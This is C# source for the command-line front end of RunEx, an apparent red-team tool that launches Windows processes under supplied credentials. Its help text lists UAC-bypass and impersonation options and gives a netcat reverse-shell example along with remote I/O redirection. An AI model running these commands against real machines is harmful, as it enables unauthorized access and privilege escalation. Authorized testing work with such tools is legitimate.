using System;
using System.Collections.Generic;
using System.Security.Principal;

public static class RunExMainClass
{
    private static readonly string help = @"
RunEx v2.1 - @totekuh

Usage:
    RunEx.exe username password cmd [args...] [options]
    RunEx.exe username password [options] -- cmd [args...]

Description:
    Run a process as a different user with explicit credentials.
    Supports multiple logon types, CreateProcess functions, and
    I/O redirection (including to remote hosts).

Positional arguments:
    username                username of the user
    password                password of the user
    cmd [args...]           command to execute. Extra arguments are joined
                            automatically, so quoting is optional:
                              RunEx.exe user pass cmd /c whoami /all
                              RunEx.exe user pass ""cmd /c whoami /all""
                            Use -- to stop flag parsing so command arguments
                            that collide with RunEx flags are not consumed:
                              RunEx.exe user pass -l 8 -- cmd /c echo -v

Options:
    -h, --help              show this help message and exit
        --help-all          show extended reference (all logon types, etc.)
    -V, --version           show version and exit
    -d, --domain <domain>   domain of the user, if in a domain (default: """")
    -l, --logon-type <type> logon type for the new process token (default: 2)
                            Accepts a number or name alias. See guide below.
                            Common: interactive (2), cleartext (8), newcreds|netonly (9)
    -f, --function <id>     CreateProcess function to use (auto-detected
                            based on current privileges when not specified)
                              0  asuser          CreateProcessAsUserW
                              1  withtoken       CreateProcessWithTokenW
                              2  withlogon       CreateProcessWithLogonW
    -t, --timeout <ms>      wait time in ms for the process to finish and
                            return output. 0 = background, no output.
                            (default: 120000)
    -r, --remote <host:port>
                            redirect stdin/stdout/stderr to a remote host.
                            Implies -t 0 (background process).
    -p, --force-profile     force creation of the user profile directory.
                            Ensures correct environment variables.
                            WARNING: creates C:\Users\<user> if absent.
    -b, --bypass-uac        attempt a UAC bypass to get an unfiltered token.
                            Only works with -f 2 (CreateProcessWithLogonW).
    -i, --impersonate       create a process and assign the logged-on user's
                            token to the main thread.
    -P, --passthrough       connect stdin/stdout/stderr directly to the
                            child process for real-time I/O. Waits for
                            the child to exit and propagates its exit code.
                            Mutually exclusive with --remote.
                            NOTE: exe only, not supported in Invoke-RunEx.
    -v, --verbose           show step-by-step execution details.

Logon types:
    interactive (2)   Full logon session, token cached in LSASS. Subject
        [default]     to UAC filtering for admin accounts. whoami shows
                      the target user. This is what runas.exe does.

    cleartext (8)     Not filtered by UAC — full admin token with all
                      privileges. Creds available for outbound network
                      auth. Use when you need an unfiltered token, or
                      when interactive logon is denied by policy.

    newcreds|netonly (9)
                      /netonly — creds only apply to outbound network
                      connections (SMB, LDAP, Kerberos). whoami still
                      shows YOU. Use for accessing domain resources from
                      a non-domain-joined machine.

    Other values (3-7, 10-11) are accepted but rarely needed.
    Use --help-all to see the full reference.

Examples:
    Run a command as a local user:
        RunEx.exe user1 password1 cmd /c whoami /all

    Execute a program as another local user:
        RunEx.exe user1 password1 -P -- C:\tools\seatbelt.exe -group=all

    Run as a domain user with NetworkCleartext logon:
        RunEx.exe user1 password1 cmd /c whoami /all -d domain -l cleartext

    Spawn a background reverse shell (no output captured):
        RunEx.exe user1 password1 -t 0 -- C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe

    Redirect I/O to a remote listener:
        RunEx.exe user1 password1 cmd.exe -r 10.10.10.10:4444

    Access AD resources with domain creds (/netonly):
        RunEx.exe user1 password1 -l newcreds -f withlogon -d DOMAIN -- net view \\dc.domain.local

    Bypass UAC as an admin:
        RunEx.exe adm1 password1 ""cmd /c whoami /priv"" --bypass-uac

    Impersonation (write to a privileged path):
        RunEx.exe adm1 password1 -l cleartext -i -- cmd /c echo admin > C:\Windows\admin

    Real-time I/O passthrough (like runas /netonly):
        RunEx.exe user1 password1 -l newcreds -f withlogon -d DOMAIN -P -- cmd.exe

    PowerShell (using the Invoke wrapper):
        . .\Invoke-RunEx.ps1
        Invoke-RunEx -Username user1 -Password password1 -Command ""cmd /c whoami""
";

    private static readonly string helpAll = @"
All logon types (-l, --logon-type):
    Value  Alias         Win32 Name              Notes
    -----  -----         ----------              -----
    2      interactive   Interactive             Standard logon, token cached in LSASS.
                                                 Subject to UAC filtering. [default]
    3      network       Network                 No token caching, can't access local
                                                 resources as the target user.
    4      batch         Batch                   Scheduled task context.
    5      service       Service                 Service account context. Gets
                                                 SeImpersonatePrivilege by default.
    7      unlock        Unlock                  Workstation unlock context.
    8      cleartext     NetworkCleartext        Not UAC-filtered. Full admin token.
                                                 Creds available for network auth.
    9      newcreds|netonly  NewCredentials       /netonly. Creds only for outbound
                                                 network. whoami shows current user.
    10     remote        RemoteInteractive       RDP logon type.
    11     cached        CachedInteractive       Cached domain credentials.

All CreateProcess functions (-f, --function):
    Value  Alias         Win32 Function           Privileges Required
    -----  -----         --------------           -------------------
    0      asuser        CreateProcessAsUserW     SeAssignPrimaryTokenPrivilege
                                                  (typically SYSTEM)
    1      withtoken     CreateProcessWithTokenW  SeImpersonatePrivilege
                                                  (typically admin/SYSTEM)
    2      withlogon     CreateProcessWithLogonW  None — works as any user [default]

    Auto-detected based on current token privileges when -f is not specified.
";

    public static bool Verbose = false;

    public static void VerboseLog(string msg)
    {
        if (Verbose) Console.Out.WriteLine("[*] " + msg);
    }

    private struct Choice {
        public int Value;
        public string Name;
        public string Alias;
        public Choice(int v, string name, string alias) { Value = v; Name = name; Alias = alias; }
    }

    private static Choice[] logonTypes = new Choice[] {
        new Choice(2,  "Interactive",       "interactive"),
        new Choice(3,  "Network",           "network"),
        new Choice(4,  "Batch",             "batch"),
        new Choice(5,  "Service",           "service"),
        new Choice(7,  "Unlock",            "unlock"),
        new Choice(8,  "NetworkCleartext",  "cleartext"),
        new Choice(9,  "NewCredentials",    "newcreds"),
        new Choice(9,  "NewCredentials",    "netonly"),
        new Choice(10, "RemoteInteractive", "remote"),
        new Choice(11, "CachedInteractive", "cached"),
    };

    private static Choice[] createProcessFunctions = new Choice[] {
        new Choice(0, "CreateProcessAsUserW",    "asuser"),
        new Choice(1, "CreateProcessWithTokenW",  "withtoken"),
        new Choice(2, "CreateProcessWithLogonW",  "withlogon"),
    };

    private static int ValidateChoice(string input, Choice[] choices, string label)
    {
        int num;
        try { num = Convert.ToInt32(input); } catch { num = -1; }
        string lower = input.ToLower();
        for (int i = 0; i < choices.Length; i++) {
            if (choices[i].Value == num || choices[i].Alias == lower)
                return choices[i].Value;
        }
        string error = "Invalid " + label + ": " + input + "\r\n[-] Allowed values:\r\n";
        for (int i = 0; i < choices.Length; i++)
            error += String.Format("[-]     {0}\t{1}\t{2}\r\n", choices[i].Value, choices[i].Alias, choices[i].Name);
        throw new RunExException(error);
    }

    private static string ChoiceName(int value, Choice[] choices)
    {
        for (int i = 0; i < choices.Length; i++)
            if (choices[i].Value == value) return choices[i].Name;
        return value.ToString();
    }

    private static uint ValidateProcessTimeout(string timeout)
    {
        uint processTimeout = 120000;
        try {
            processTimeout = Convert.ToUInt32(timeout);
        }
        catch {
            throw new RunExException("Invalid process_timeout value: " + timeout);
        }
        return processTimeout;
    }

    private static string[] ValidateRemote(string remote)
    {
        string[] split = remote.Split(':');
        if( split.Length != 2 ) {
            string error = "Invalid remote value: " + remote + "\r\n";
            error += "[-] Expected format: 'host:port'";
            throw new RunExException(error);
        }
        return split;
    }

    private static int DefaultCreateProcessFunction()
    {
        int createProcessFunction = 2;
        IntPtr currentTokenHandle = WindowsIdentity.GetCurrent().Token;
        List<string[]> privs = new List<string[]>();
        privs = AccessToken.GetTokenPrivileges(currentTokenHandle);
        bool SeAssignPrimaryTokenPrivilegeAssigned = false;
        bool SeImpersonatePrivilegeAssigned = false;
        AccessToken.IntegrityLevel currentIL = AccessToken.GetTokenIntegrityLevel(currentTokenHandle);
        foreach (string[] s in privs)
        {
            string privilege = s[0];
            if(privilege == "SeAssignPrimaryTokenPrivilege" && currentIL >= AccessToken.IntegrityLevel.Medium)
                SeAssignPrimaryTokenPrivilegeAssigned = true;
            if(privilege == "SeImpersonatePrivilege" && currentIL >= AccessToken.IntegrityLevel.High)
                SeImpersonatePrivilegeAssigned = true;
        }
        if (SeAssignPrimaryTokenPrivilegeAssigned)
            createProcessFunction = 0;
        else
            if (SeImpersonatePrivilegeAssigned)
                createProcessFunction = 1;
        return createProcessFunction;
    }

    public static string RunExMain(string[] args)
    {
        string output = "";
        List<string> positionals = new List<string>();
        string username, password, cmd, domain;
        username = password = cmd = domain = string.Empty;
        string[] remote = null;
        uint processTimeout = 120000;
        int logonType = 2, createProcessFunction = -1;
        bool forceUserProfileCreation = false, bypassUac = false, remoteImpersonation = false, passthrough = false, timeoutExplicit = false;

        try {
            for(int ctr = 0; ctr < args.Length; ctr++) {
                if (args[ctr] == "--") {
                    for (ctr++; ctr < args.Length; ctr++)
                        positionals.Add(args[ctr]);
                    break;
                }
                switch (args[ctr])
                {
                    case "-V":
                    case "--version":
                        return "RunEx v2.1";

                    case "-h":
                    case "--help":
                    case "/?":
                        Console.Out.Write(help);
                        return "";

                    case "--help-all":
                        Console.Out.Write(help);
                        Console.Out.Write(helpAll);
                        return "";

                    case "-d":
                    case "--domain":
                        domain = args[++ctr];
                        break;

                    case "-t":
                    case "--timeout":
                        processTimeout = ValidateProcessTimeout(args[++ctr]);
                        timeoutExplicit = true;
                        break;

                    case "-l":
                    case "--logon-type":
                        logonType = ValidateChoice(args[++ctr], logonTypes, "logon type");
                        break;

                    case "-f":
                    case "--function":
                        createProcessFunction = ValidateChoice(args[++ctr], createProcessFunctions, "createProcess function");
                        break;

                    case "-r":
                    case "--remote":
                        remote = ValidateRemote(args[++ctr]);
                        break;

                    case "-p":
                    case "--force-profile":
                        forceUserProfileCreation = true;
                        break;

                    case "-b":
                    case "--bypass-uac":
                        bypassUac = true;
                        break;

                    case "-i":
                    case "--impersonate":
                        remoteImpersonation = true;
                        break;

                    case "-P":
                    case "--passthrough":
                        passthrough = true;
                        break;

                    case "-v":
                    case "--verbose":
                        Verbose = true;
                        break;

                    default:
                        positionals.Add(args[ctr]);
                        break;
                }
            }
        } catch(System.IndexOutOfRangeException) {
            return "[-] Invalid arguments. Use --help for additional help.";
        } catch(RunExException e) {
            return String.Format("{0}", e.Message);
        }

        if( positionals.Count < 3 ) {
            return "[-] Not enough arguments. 3 Arguments required. Use --help for additional help.";
        }

        if (createProcessFunction < 0)
            createProcessFunction = DefaultCreateProcessFunction();

        username = positionals[0];
        password = positionals[1];
        cmd = positionals[2];
        for (int i = 3; i < positionals.Count; i++)
            cmd += " " + positionals[i];

        VerboseLog("Username: " + username);
        VerboseLog("Domain: " + (domain == "" ? "(local)" : domain));
        VerboseLog("Logon type: " + logonType + " (" + ChoiceName(logonType, logonTypes) + ")");
        VerboseLog("CreateProcess function: " + createProcessFunction + " (" + ChoiceName(createProcessFunction, createProcessFunctions) + ")");
        VerboseLog("Process timeout: " + processTimeout + " ms");
        if (remote != null) VerboseLog("Remote: " + remote[0] + ":" + remote[1]);
        if (passthrough) VerboseLog("Passthrough: enabled");
        if (forceUserProfileCreation) VerboseLog("Force profile creation: enabled");
        if (bypassUac) VerboseLog("Bypass UAC: enabled");
        if (remoteImpersonation) VerboseLog("Remote impersonation: enabled");

        if (passthrough && remote != null) {
            return "[-] --passthrough and --remote are mutually exclusive.";
        }
        if (passthrough && timeoutExplicit) {
            Console.Out.WriteLine("[*] Warning: --timeout is ignored in passthrough mode (will wait for child to exit).");
        }

        if( remote != null ) {
            processTimeout = 0;
        }

        RunEx invoker = new RunEx();
        try {
            output = invoker.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote, forceUserProfileCreation, bypassUac, remoteImpersonation, passthrough);
        } catch(RunExException e) {
            invoker.CleanupHandles();
            output = String.Format("{0}", e.Message);
        }

        Environment.ExitCode = invoker.ExitCode;

        return output;
    }
}

class MainClass
{
    static void Main(string[] args)
    {
        Console.Out.Write(RunExMainClass.RunExMain(args));
        Console.Out.Flush();
    }
}
